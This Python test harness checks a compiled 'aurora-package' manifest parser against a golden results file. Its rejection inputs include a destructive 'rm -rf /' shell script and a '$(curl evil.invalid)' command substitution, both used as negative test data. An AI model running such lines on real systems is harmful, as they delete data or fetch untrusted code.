#!/usr/bin/env python3
"""package.manifest through one compiled driver fed every case as a record.

Inputs are generated here; expected results are the reviewed golden file
golden/package_manifest.jsonl, frozen from the earlier independent line-grammar
model after it reproduced the old test's ordered expectations exactly. Golden
rows hold semantic results (a failure status, or identity tokens); `words`
expands them into the driver's observation layout. Rejections compile once each.
"""

from __future__ import annotations

import argparse
from pathlib import Path
import random

import runtime_records as records

GOLDEN = Path(__file__).with_name("golden")
require = records.require
U32, U64 = (1 << 32) - 1, (1 << 64) - 1
IMIN, IMAX = records.MIN, records.MAX
COUNT_FALLBACK, INDEX_FALLBACK = IMIN + 123456789, -81985529216486896
FALLBACKS = (U64, 1 << 63, 0xFEDCBA9876543210)
IDENTITY = ("success", "malformed", "out_of_range")
DEPENDENCY = ("success", "malformed", "out_of_range", "index_out_of_range")
OPERATIONS = ("parse", "manifest", "dependency", "owned", "eager", "separate", "getters")
SCALARS = (
    "operation",
    "length",
    "offset",
    "count",
    "index",
    "status",
    "root_status",
    "root_length",
    "dep_status",
    "dep_length",
)
VERSIONS = ("root_major", "root_minor", "root_patch", "dep_major", "dep_minor", "dep_patch")
SPAN = "builtin::span<const u8>"


def signed(value):
    return "(-9223372036854775807-1)" if value == IMIN else str(value)


def manifest(root=b"a@0.0.0", deps=()):
    return b"aurora-package 1\npackage " + root + b"\n" + b"".join(b"depends " + x + b"\n" for x in deps) + b"end\n"


def split_token(token):
    """Golden/input token spelling `name@major.minor.patch` as (name, version)."""
    name, version = token.split("@") if isinstance(token, str) else token.decode("ascii").split("@")
    return name.encode("ascii"), tuple(int(part) for part in version.split("."))


def name_words(name):
    """The 24 name bytes as three little-endian u64 words, as the driver packs them."""
    name = name.ljust(24, b"\0")
    return tuple(int.from_bytes(name[i : i + 8], "little") for i in range(0, 24, 8))


def identity_words(token):
    if token is None:
        return (2, 0, *FALLBACKS, *name_words(b""))
    name, version = split_token(token)
    return (1, len(name), *version, *name_words(name))


def manifest_words(status, count=0, root=None):
    good = status == "success"
    return (
        IDENTITY.index(status) + 1,
        count if good else COUNT_FALLBACK & U64,
        *identity_words(root if good else None),
    )


def dependency_words(status, count=0, index=0, root=None, dep=None):
    good = status == "success"
    return (
        DEPENDENCY.index(status) + 1,
        count if good else COUNT_FALLBACK & U64,
        index if good else INDEX_FALLBACK & U64,
        *identity_words(root if good else None),
        *identity_words(dep if good else None),
    )


def parse_words(expected, index):
    """A manifest is a failure status or [root, dependencies...] tokens."""
    if isinstance(expected, str):
        return manifest_words(expected) + dependency_words(expected)
    root, deps = expected[0], expected[1:]
    selected = 0 <= index < len(deps)
    return manifest_words("success", len(deps), root) + (
        dependency_words("success", len(deps), index, root, deps[index])
        if selected
        else dependency_words("index_out_of_range")
    )


def words(operation, values, expected):
    if operation == "parse":
        return list(parse_words(expected, values.get("index", 0)))
    if operation == "manifest":
        return list(manifest_words(*expected) if isinstance(expected, list) else manifest_words(expected))
    if operation == "dependency":
        return list(dependency_words(*expected) if isinstance(expected, list) else dependency_words(expected))
    return list(expected)


def driver_source():
    declarations, initializers, reader = records.byte_fields()
    source = "module manifest_driver;import package.manifest;import package.identity;import std.array;\n"
    # Same-named private-helper shadows in the test module must not bind into
    # the defining module; every case runs with them present.
    source += (
        "namespace package{auto manifest_name_equal(IdentityResult a,IdentityResult b)->bool{return false;}"
        "auto manifest_literal(builtin::span<const u8> bytes,i64 offset,builtin::span<const u8> literal)"
        "->bool{return true;}"
        "auto manifest_line_end(builtin::span<const u8> bytes,i64 start,i64 end)->i64{return -1;}}\n"
    )
    source += (
        "auto bits(i64 value)->u64{if(value<0){return 9223372036854775808u64+"
        "u64(value-(-9223372036854775807-1));}return u64(value);}\n"
        "auto observe_identity(package::IdentityResult r,i64 slot)->u64{"
        "if(slot==0){if(r.status()==package::IdentityStatus::success){return 1u64;}"
        "if(r.status()==package::IdentityStatus::malformed){return 2u64;}return 3u64;}"
        "if(slot==1){return u64(r.name_size());}"
    )
    for slot, (method, fallback) in enumerate(zip(("major_or", "minor_or", "patch_or"), FALLBACKS), 2):
        source += f"if(slot=={slot}){{return r.{method}({fallback}u64);}}"
    # Every name byte is observed, eight to a word, lowest index in the low byte.
    source += (
        "const std::array<u8,24> storage=r.name_bytes_or_zero();const i64 first=8*(slot-5);"
        "u64 word=0u64;i64 i=7;while(i>=0){word=(word<<8)|u64(storage.at(first+i));i=i-1;}return word;}\n"
        "auto observe_manifest(package::ManifestResult r,i64 slot)->u64{"
        "if(slot==0){if(r.status()==package::ManifestStatus::success){return 1u64;}"
        "if(r.status()==package::ManifestStatus::malformed){return 2u64;}return 3u64;}"
        f"if(slot==1){{return bits(r.dependency_count_or({signed(COUNT_FALLBACK)}));}}"
        "const package::IdentityResult root=r.identity_or_error();return observe_identity(root,slot-2);}\n"
        "auto observe_dependency(package::DependencyResult r,i64 slot)->u64{"
        "if(slot==0){if(r.status()==package::DependencyStatus::success){return 1u64;}"
        "if(r.status()==package::DependencyStatus::malformed){return 2u64;}"
        "if(r.status()==package::DependencyStatus::out_of_range){return 3u64;}return 4u64;}"
        f"if(slot==1){{return bits(r.dependency_count_or({signed(COUNT_FALLBACK)}));}}"
        f"if(slot==2){{return bits(r.index_or({signed(INDEX_FALLBACK)}));}}"
        "if(slot<11){const package::IdentityResult root=r.identity_or_error();return observe_identity(root,slot-3);}"
        "const package::IdentityResult dep=r.dependency_or_error();return observe_identity(dep,slot-11);}\n"
        "auto copy_manifest(package::ManifestResult r)->package::ManifestResult{return r;}\n"
        "auto copy_dependency(package::DependencyResult r)->package::DependencyResult{return r;}\n"
        "class Counter{i64 calls;public:Counter():calls(0){}"
        "auto next()->i64{calls=calls+1;return -81985529216486896;}auto count()const->i64{return calls;}};\n"
    )
    source += "class ManifestInput{" + declarations + "".join(f"i64 {name};" for name in SCALARS)
    source += "".join(f"u64 {name};" for name in VERSIONS) + "public:ManifestInput():"
    source += ",".join(initializers + [f"{name}(0)" for name in SCALARS] + [f"{name}(0u64)" for name in VERSIONS])
    source += "{}" + reader
    load = records.ZERO_OWNER + "i64 at=0;while(at<length){owner[at]=input_byte(at);at=at+1;}"
    source += f"auto parse_view({SPAN} source)const->package::ManifestResult{{"
    source += f"const {SPAN} view=source.subspan(0,length);"
    source += "const package::ManifestResult result=package::parse_manifest(view,offset,count);return result;}"
    source += f"auto dependency_view({SPAN} source)const->package::DependencyResult{{"
    source += f"const {SPAN} view=source.subspan(0,length);"
    source += "const package::DependencyResult result=package::manifest_dependency(view,offset,count,index);"
    source += "return result;}"
    # Owners local to these calls are destroyed before their copied results are used.
    source += "auto make_manifest()const->package::ManifestResult{{" + load
    source += "const package::ManifestResult r=parse_view(borrow_bytes(owner));return r;}}"
    source += "auto make_dependency()const->package::DependencyResult{{" + load
    source += "const package::DependencyResult r=dependency_view(borrow_bytes(owner));return r;}}"
    for prefix in ("root", "dep"):
        source += f"auto {prefix}_name()const->std::array<u8,24>{{std::array<u8,24> name=std::array<u8,24>();"
        start = 0 if prefix == "root" else 24
        source += f"i64 i=0;while(i<24){{name.set(i,input_byte({start}+i));i=i+1;}}return name;}}"
        source += f"auto {prefix}_identity_status()const->package::IdentityStatus{{"
        source += "".join(
            f"if({prefix}_status=={n}){{return package::IdentityStatus::{name};}}" for n, name in enumerate(IDENTITY)
        )
        source += "return package::IdentityStatus::out_of_range;}"
    source += "auto manifest_status()const->package::ManifestStatus{"
    source += "".join(f"if(status=={n}){{return package::ManifestStatus::{name};}}" for n, name in enumerate(IDENTITY))
    source += "return package::ManifestStatus::out_of_range;}"
    source += "auto dependency_status()const->package::DependencyStatus{"
    source += "".join(
        f"if(status=={n}){{return package::DependencyStatus::{name};}}" for n, name in enumerate(DEPENDENCY)
    )
    source += "return package::DependencyStatus::index_out_of_range;}"
    source += "auto entry(i64 slot)const->u64{"
    # Two independent calls each validate the complete original owner, which
    # is overwritten only after the copied result exists and the borrow ended.
    source += "if(operation==0){" + load
    source += "if(slot<10){const package::ManifestResult parsed=parse_view(borrow_bytes(owner));"
    source += "const package::ManifestResult r=parsed;"
    source += "i64 i=0;while(i<length){owner[i]=255u8;i=i+1;}return observe_manifest(r,slot);}"
    source += "const package::DependencyResult parsed=dependency_view(borrow_bytes(owner));"
    source += "const package::DependencyResult r=parsed;"
    source += "i64 i=0;while(i<length){owner[i]=0u8;i=i+1;}return observe_dependency(r,slot-10);}"
    root = (
        "std::array<u8,24> root_storage=root_name();const package::IdentityResult root=package::IdentityResult("
        "root_identity_status(),root_storage,root_length,root_major,root_minor,root_patch);"
    )
    dep = (
        "std::array<u8,24> dep_storage=dep_name();const package::IdentityResult dep=package::IdentityResult("
        "dep_identity_status(),dep_storage,dep_length,dep_major,dep_minor,dep_patch);"
    )
    source += "if(operation==1){" + root
    source += "const package::ManifestResult original=package::ManifestResult(manifest_status(),root,count);"
    source += "const package::ManifestResult r=original;root_storage.set(0,255u8);return observe_manifest(r,slot);}"
    source += "if(operation==2){" + root + dep
    source += "const package::DependencyResult original="
    source += "package::DependencyResult(dependency_status(),root,dep,count,index);"
    source += "const package::DependencyResult r=original;root_storage.set(0,255u8);dep_storage.set(0,255u8);"
    source += "return observe_dependency(r,slot);}"
    source += "if(operation==3){if(slot<10){const package::ManifestResult a=make_manifest();"
    source += "const package::ManifestResult r=copy_manifest(a);return observe_manifest(r,slot);}"
    source += "const package::DependencyResult a=make_dependency();"
    source += "const package::DependencyResult r=copy_dependency(a);return observe_dependency(r,slot-10);}"
    # Fallback arguments are evaluated eagerly, exactly once per call.
    source += "if(operation==4){const package::ManifestResult m=make_manifest();"
    source += "const package::DependencyResult d=make_dependency();"
    source += "Counter c=Counter();const i64 a=m.dependency_count_or(c.next());"
    source += "const i64 b=d.dependency_count_or(c.next());const i64 i=d.index_or(c.next());"
    source += "if(slot==0){return bits(c.count());}if(slot==1){return bits(a);}"
    source += "if(slot==2){return bits(b);}return bits(i);}"
    # Separate calls observe their own changed input; retained reports stay copied.
    source += "if(operation==5){" + load
    source += "const package::DependencyResult before=dependency_view(borrow_bytes(owner));owner[0]=0u8;"
    source += "const package::DependencyResult after=dependency_view(borrow_bytes(owner));"
    source += "if(slot<19){return observe_dependency(before,slot);}return observe_dependency(after,slot-19);}"
    source += "const package::DependencyResult r=make_dependency();"
    source += "const package::IdentityResult root=r.identity_or_error();"
    source += "const package::IdentityResult dep=r.dependency_or_error();"
    source += "std::array<u8,24> rn=root.name_bytes_or_zero();std::array<u8,24> dn=dep.name_bytes_or_zero();"
    source += "i64 i=0;while(i<24){rn.set(i,255u8);dn.set(i,255u8);i=i+1;}return observe_dependency(r,slot);}};\n"
    return source


def parsing_cases():
    cases = []

    def add(label, data, offset=0, count=None, index=0, mutation=None):
        count = len(data) if count is None else count
        data = data or b"\0"
        if mutation is not None:
            position, value = mutation
            data = data[:position] + bytes([value]) + data[position + 1 :]
        cases.append((label, "parse", dict(data=data, offset=offset, count=count, index=index)))

    maximum = b"z" * 24 + b"@4294967295.4294967295.4294967295"
    deps = tuple(bytes([97 + i]) + b"q" * 23 + b"@4294967295.4294967295.4294967295" for i in range(8))
    for root, ds in ((b"a@0.0.0", ()), (maximum, deps), (b"app@2147483648.0.17", (b"lib-a@0.0.0", b"lib-b@0.0.0"))):
        for index in (IMIN, -1, *range(10), IMAX):
            add(f"canonical/{len(ds)}/{index}", manifest(root, ds), index=index)
    for count in range(11):
        ds = tuple(bytes([98 + i]) + b"@1.2.3" for i in range(count))
        for index in (-1, 0, count - 1, count):
            add(f"dependency-limit/{count}/{index}", manifest(deps=ds), index=index)
    for token in (manifest(), manifest(b"a1-b2@12.34.56", (b"c3-d4@56.78.90",)), manifest(maximum, deps)):
        for cut in range(len(token)):
            add(f"truncation/{len(token)}/{cut}", token, count=cut)
        # Every distinct starting boundary must not accidentally accept a suffix.
        for cut in range(1, len(token) + 1):
            add(f"suffix/{len(token)}/{cut}", token, offset=cut, count=len(token) - cut)
    representative = manifest(b"a1-b2@12.34.56", (b"c3-d4@56.78.90",))
    for position in range(len(representative)):
        for value in records.SAMPLE_BYTES:
            add(f"all-byte-substitution/{position}/{value}", representative, mutation=(position, value))
    for data in (
        b"",
        b"\0",
        b"aurora-package 1\n",
        b"end\n",
        b"package a@1.2.3\nend\n",
        b"aurora-package 1\nend\n",
        b"aurora-package 1\npackage a@1.2.3\n",
        b"aurora-package 1\npackage a@1.2.3\ndepends b@1.2.3\n",
        b"#!/bin/sh\nrm -rf /\n",
        b"$(curl evil.invalid)\n",
    ):
        add("missing-or-script/" + data.hex(), data, index=IMIN)
    seed = manifest(b"app@1.2.3", (b"lib@3.2.1",))
    add("dependency-only-crlf", seed.replace(b"depends lib@3.2.1\n", b"depends lib@3.2.1\r\n"))
    for bad in (b"\0", b"\r", b"\r\n", b" ", b"\t", b"\n", b"\xef\xbb\xbf", b"# comment\n", b"end\n", b"execute sh\n"):
        add("leading/" + bad.hex(), bad + seed)
        add("trailing/" + bad.hex(), seed + bad)
        add("inside/" + bad.hex(), seed[:16] + bad + seed[16:])
    for data in (
        seed.replace(b"\n", b"\r\n"),
        seed.replace(b"package ", b"package  "),
        seed.replace(b"depends ", b"depends\t"),
        seed.replace(b"aurora-package 1", b"aurora-package 01"),
        seed.replace(b"aurora-package 1", b"aurora-package 2"),
        seed.upper(),
        seed.replace(b"depends lib@3.2.1\n", b"unknown lib@3.2.1\n"),
        seed.replace(b"depends lib@3.2.1\n", b"script echo okay\n"),
        seed.replace(b"end\n", b"package b@1.2.3\nend\n"),
    ):
        add("grammar/" + data.hex(), data)
    bad_tokens = [
        b"",
        b"-@1.2.3",
        b"A@1.2.3",
        b"1a@1.2.3",
        b"a-@1.2.3",
        b"a--b@1.2.3",
        b"-a@1.2.3",
        b"a_b@1.2.3",
        b"a/b@1.2.3",
        b"a\0b@1.2.3",
        "café@1.2.3".encode(),
        b"a" * 25 + b"@1.2.3",
        b"a@1.2.3.4",
        b"a@1.2.3-pre",
        b"a@1.2.3+build",
    ]
    for number in (
        b"",
        b"00",
        b"01",
        b"+1",
        b"-1",
        b"1e2",
        b"0x1",
        b"1_0",
        b"4294967296",
        b"9999999999",
        str(U64).encode(),
    ):
        for component in range(3):
            parts = [b"1", b"2", b"3"]
            parts[component] = number
            bad_tokens.append(b"a@" + b".".join(parts))
    for bad in bad_tokens:
        add("bad-root/" + bad.hex(), manifest(bad, (b"good@1.2.3",)))
        for index in (-1, 0, 1, 2, IMAX):
            add(f"bad-late-dependency/{bad.hex()}/{index}", manifest(b"root@1.2.3", (b"good@1.2.3", bad)), index=index)
    add("self-name-different-version", manifest(b"app@1.2.3", (b"app@9.8.7",)))
    for position in range(8):
        for kind in ("self", "same-version", "different-version"):
            ds = list(deps)
            ds[position] = (
                maximum if kind == "self" else (ds[0] if kind == "same-version" else ds[0].split(b"@")[0] + b"@0.0.0")
            )
            if position == 0 and kind != "self":
                ds[-1] = ds[0].split(b"@")[0] + (
                    b"@0.0.0" if kind == "different-version" else b"@4294967295.4294967295.4294967295"
                )
            for index in (-1, 0, 7, 8):
                add(f"global-name-rule/{kind}/{position}/{index}", manifest(maximum, tuple(ds)), index=index)
    for number in (0, 1, 9, 10, 99, 2147483647, 2147483648, U32 - 1, U32, U32 + 1, U64):
        for component in range(3):
            parts = [b"1", b"2", b"3"]
            parts[component] = str(number).encode()
            token = b"version@" + b".".join(parts)
            add(f"numeric-boundary/{component}/{number}", manifest(token, (b"other@1.2.3",)))
            add(f"numeric-dependency/{component}/{number}", manifest(b"root@1.2.3", (token,)))
    for length in range(27):
        add(f"name-length/{length}", manifest(b"a" * length + b"@0.0.0"))
    owner = b"\xff\0" + seed + b"\xff\0"
    for offset in (IMIN, -1, 0, 1, 2, 3, len(owner) - 1, len(owner), len(owner) + 1, IMAX):
        for count in (IMIN, -1, 0, 1, 37, len(seed), len(owner), len(owner) + 1, IMAX):
            for index in (-1, 0, IMAX):
                add(f"window/{offset}/{count}/{index}", owner, offset, count, index)
    add("window/exact-delimited", owner, 2, len(seed))
    for length in (616, 1024, 4096):
        add(f"large-owner/{length}", b"\xff" * (length - len(seed)) + seed, length - len(seed), len(seed))
        add(f"large-invalid/{length}", b"a" * length)
    rng = random.Random(221004)
    for i in range(80):
        ds = []
        for n in range(rng.randrange(9)):
            name = bytes([98 + n]) + bytes(
                rng.choice(b"abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(rng.randrange(24))
            )
            ds.append(name + b"@" + b".".join(str(rng.randrange(1 << 32)).encode() for _ in range(3)))
        data = manifest(b"app@1.2.3", tuple(ds))
        index = rng.randrange(-1, len(ds) + 1)
        add(f"seed221004-valid/{i}", data, index=index)
        add(f"seed221004-mutation/{i}", data, index=index, mutation=(rng.randrange(len(data)), rng.randrange(256)))
    return cases


def identity_input(prefix, token, status="success", poison=False):
    """Public IdentityResult constructor inputs; poison forges length, version and padding."""
    name, version = split_token(token)
    storage = bytearray(name.ljust(24, b"\0"))
    length = len(name)
    if poison:
        length, version = IMAX, (U64, U64, U64)
        storage[23] = 255
    values = {f"{prefix}_status": IDENTITY.index(status), f"{prefix}_length": length}
    values.update({f"{prefix}_{part}": value for part, value in zip(("major", "minor", "patch"), version)})
    return bytes(storage), values


def construction_cases():
    cases = []
    roots = (
        (b"root@1.2.3", "success", False),
        (b"root@1.2.3", "success", True),
        (b"root@1.2.3", "malformed", False),
        (b"root@1.2.3", "out_of_range", True),
    )
    for status in IDENTITY:
        for number, (token, root_status, poison) in enumerate(roots):
            for count in (IMIN, -1, 0, 1, 8, 9, IMAX):
                storage, values = identity_input("root", token, root_status, poison)
                values.update(status=IDENTITY.index(status), count=count)
                cases.append(
                    (f"constructor-manifest/{status}/{number}/{count}", "manifest", dict(data=storage, **values))
                )
    root_storage, root_values = identity_input("root", b"root@4294967295.2147483648.17")
    dep_storage, dep_values = identity_input("dep", b"dep@0.1.2")
    for status in DEPENDENCY:
        for count in (IMIN, -1, 0, 1, 8, 9, IMAX):
            for index in (IMIN, -1, 0, 1, 7, 8, IMAX):
                values = dict(root_values, **dep_values, status=DEPENDENCY.index(status), count=count, index=index)
                label = f"constructor-dependency/{status}/{count}/{index}"
                cases.append((label, "dependency", dict(data=root_storage + dep_storage, **values)))
    for status in DEPENDENCY:
        for root_bad in (False, True):
            for dep_status in IDENTITY:
                for dep_poison in (False, True):
                    for same in (False, True):
                        root_storage, values = identity_input("root", b"root@1.2.3", "success", root_bad)
                        dep_token = b"root@9.8.7" if same else b"dep@9.8.7"
                        dep_storage, dep_values = identity_input("dep", dep_token, dep_status, dep_poison)
                        values.update(dep_values, status=DEPENDENCY.index(status), count=8, index=7)
                        label = f"constructor-local-invariants/{status}/{root_bad}/{dep_status}/{dep_poison}/{same}"
                        cases.append((label, "dependency", dict(data=root_storage + dep_storage, **values)))
    return cases


def ownership_cases():
    data = manifest(b"owned-root@4294967295.2147483648.17", (b"owned-dep@17.2147483648.4294967295",))
    whole = dict(offset=0, count=len(data), index=0)
    return [
        ("ownership/function-and-nested-owner-scope-exit", "owned", dict(data=data, **whole)),
        ("eager-fallback/True", "eager", dict(data=data, **whole)),
        ("eager-fallback/False", "eager", dict(data=data[:-1], offset=0, count=len(data) - 1, index=0)),
        ("ownership/separate-call-observations", "separate", dict(data=data, **whole)),
        ("ownership/getter-name-copies-isolated", "getters", dict(data=data, **whole)),
    ]


def binding_cases():
    cases = []
    for label, data in (
        ("valid", manifest(b"root@1.2.3", (b"dep@3.2.1",))),
        ("duplicate", manifest(b"root@1.2.3", (b"dep@3.2.1", b"dep@9.8.7"))),
        ("bad-header", b"X" + manifest()[1:]),
    ):
        cases.append(("defining-module-binding/" + label, "parse", dict(data=data, offset=0, count=len(data), index=0)))
    return cases


def all_cases():
    return parsing_cases() + construction_cases() + ownership_cases() + binding_cases()


def packet(program, operation, values):
    values = dict(values)
    data = values.pop("data")
    return program.pack(data=data, operation=OPERATIONS.index(operation), length=len(data), **values)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--compiler", type=Path, required=True)
    args = parser.parse_args()
    cases = all_cases()
    golden = records.load_jsonl(GOLDEN / "package_manifest.jsonl")
    require(len(golden) == len(cases), f"{len(cases)} generated cases, {len(golden)} golden rows")
    for (label, _, _), row in zip(cases, golden):
        require(row["label"] == label, f"golden row {row['label']!r} for case {label!r}")
    with records.scratch("package-manifest") as scratch:
        driver = records.Driver(args.compiler, scratch)
        program = driver.build(driver_source(), "ManifestInput", kind="u64")
        count, observed = program.check(
            (
                (label, packet(program, operation, values), words(operation, values, row["expected"]))
                for (label, operation, values), row in zip(cases, golden)
            ),
            scratch,
        )
        rejections = driver.reject_all(GOLDEN / "package_manifest_rejections.jsonl")
    print(f"PASS package manifest: {count} cases, {observed} u64 observations, {rejections} rejections")


if __name__ == "__main__":
    main()
